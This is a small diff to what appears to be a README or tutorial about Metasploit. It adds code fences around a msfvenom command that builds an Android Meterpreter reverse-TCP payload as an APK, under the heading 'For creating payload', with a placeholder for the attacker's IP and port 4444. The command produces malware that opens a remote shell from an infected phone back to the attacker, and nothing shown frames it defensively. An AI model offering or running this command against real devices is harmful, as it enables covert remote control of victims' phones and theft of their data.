@@ -23,5 +23,6 @@ msfconsole
 ```
 
 # For creating payload
-
+```
 msfvenom -p android/meterpreter/reverse_tcp LHOST=(your IP) LPORT=4444 R> payload.apk
+```
